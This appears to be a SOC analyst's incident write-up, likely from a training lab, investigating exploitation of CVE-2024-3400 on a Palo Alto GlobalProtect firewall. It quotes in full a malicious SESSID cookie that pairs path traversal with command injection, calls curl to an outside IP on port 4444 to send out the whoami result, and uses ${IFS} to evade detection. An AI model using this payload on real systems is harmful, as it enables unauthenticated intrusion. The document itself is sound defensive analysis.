🔍 Step 2: Alert Details Review - Finding the Malicious Cookie

I viewed the full alert details and immediately noticed something suspicious in the cookie field.

📸 Alert details - SESSID cookie with path traversal and command injection
Malicious Cookie Found:

SESSID=./../../../opt/panlogs/tmp/device_telemetry/hour/aaa`curl${IFS}144.172.79.92:4444?user=$(whoami)`

What I observed:
• Path traversal: ./../../../ (trying to navigate up directories)
• Command injection: Backticks ` ` and $(whoami)
• Outbound connection: curl to 144.172.79.92:4444
• Information disclosure: Trying to get the current username via whoami
• IFS bypass: ${IFS} instead of spaces to avoid detection
• Requested endpoint: /global-protect/login.esp

Key observation: Port 4444 is the default port used by the Metasploit framework. While this doesn't guarantee Metasploit was used, it's a strong indicator of malicious C2 activity.

📖 Step 8: Vulnerability Research - CVE-2024-3400

I searched Google for CVE-2024-3400 to understand what this vulnerability is and found the NIST description.

📸 NIST CVE-2024-3400 - Command injection in Palo Alto PAN-OS GlobalProtect
CVE-2024-3400 Description (NIST):

"A command injection as a result of arbitrary file creation vulnerability in the GlobalProtect feature of Palo Alto Networks PAN-OS software for specific PAN-OS versions and distinct feature configurations may enable an unauthenticated attacker to execute arbitrary code with root privileges on the firewall."

Impact: Unauthenticated RCE with root privileges
Affected: Specific PAN-OS versions with GlobalProtect enabled
Not affected: Cloud NGFW, Panorama, Prisma Access

This perfectly matches what I saw in the alert - an unauthenticated attacker sending a crafted request to the GlobalProtect endpoint.

📝 Conclusion

This was a successful true positive exploitation of CVE-2024-3400. The attacker used a combination of path traversal and command injection in the SESSID cookie to execute arbitrary commands on PA-Firewall-01. They successfully spawned a malicious python3 process running update.py, which was confirmed malicious by 37 antivirus engines on VirusTotal.

⚠️ Key Takeaway: Always check running processes, even when terminal and browser history are empty. The attacker tried to hide their activity by clearing history, but process monitoring revealed the compromise. I isolated the endpoint and escalated to Tier 2 for further remediation.
